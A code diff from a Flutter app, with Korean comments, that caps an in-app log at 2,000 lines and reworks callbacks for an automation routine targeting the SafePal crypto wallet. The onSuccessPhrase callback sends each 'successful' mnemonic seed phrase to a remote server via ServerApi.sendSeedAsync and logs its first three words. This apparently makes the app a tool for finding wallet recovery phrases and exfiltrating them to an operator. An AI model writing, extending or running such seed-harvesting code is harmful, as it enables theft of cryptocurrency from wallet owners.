@@ -154,6 +154,11 @@ class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
     if (!mounted) return;
     setState(() {
       _logLines.add(text);
+      // 메모리 사용 제한: 오래 실행될 때를 대비해 최근 N줄만 유지
+      const maxLogLines = 2000;
+      if (_logLines.length > maxLogLines) {
+        _logLines.removeRange(0, _logLines.length - maxLogLines);
+      }
       WidgetsBinding.instance.addPostFrameCallback((_) {
         if (mounted && _logController.hasClients) {
           _logController.animateTo(
@@ -404,18 +409,30 @@ class _MainScreenState extends State<MainScreen> with WidgetsBindingObserver {
 
     await AutomationRunner.runSafePal(
       logLine: (t) {
-        if (mounted) _appendLog(t);
-        else AutomationLogFile.append(t).catchError((_) {});
+        if (mounted) {
+          _appendLog(t);
+        } else {
+          AutomationLogFile.append(t).catchError((_) {});
+        }
       },
       logLineRed: (t) {
-        if (mounted) _appendLog(t, red: true);
-        else AutomationLogFile.append(t).catchError((_) {});
-      },
-      onSuccessPhrase: (p) {
-        final token = ServerApi.currentToken;
-        if (token != null && token.isNotEmpty) {
-          ServerApi.sendSeedAsync(token, p);
+        if (mounted) {
+          _appendLog(t, red: true);
+        } else {
+          AutomationLogFile.append(t).catchError((_) {});
         }
+      },
+      onSuccessPhrase: (p) async {
+        // SafePal은 "성공한" 니모닉만 서버로 전송
+        final token = ServerApi.currentToken;
+        if (token == null || token.isEmpty) {
+          _appendLog('→ success 시드 발견 (토큰 없음, 서버 전송 생략)', red: true);
+          return;
+        }
+        // 앞부분만 로그에 남겨서 실제 전송 여부를 눈으로 확인 가능하게 한다.
+        final preview = p.split(' ').take(3).join(' ');
+        _appendLog('→ success 시드 전송 요청: "$preview ..."');
+        await ServerApi.sendSeedAsync(token, p);
       },
       replaceLogLastLine: (t) {
         if (!mounted) return;
